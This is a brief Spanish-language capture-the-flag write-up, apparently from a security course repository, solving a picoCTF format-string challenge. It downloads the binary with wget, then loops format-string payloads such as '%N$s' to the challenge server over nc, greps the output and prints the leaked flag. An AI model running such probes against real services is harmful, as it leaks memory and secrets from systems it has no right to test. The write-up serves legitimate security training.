## Descripción 
```
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using:`nc saturn.picoctf.net 65521`
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#objetivo)
## Solución
```
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/flagleak$ wget https://artifacts.picoctf.net/c/91/vuln
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/flagleak$ wget https://artifacts.picoctf.net/c/91/vuln.c
porti_04@DESKTOP-8HT902T:~/pico_retos/binexp/flagleak$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 58428 | grep -Ei 'pico|ctf'; done
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}


flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}

```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#soluci%C3%B3n)

## Notas Adicionales

[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#notas-adicionales)

### Referencias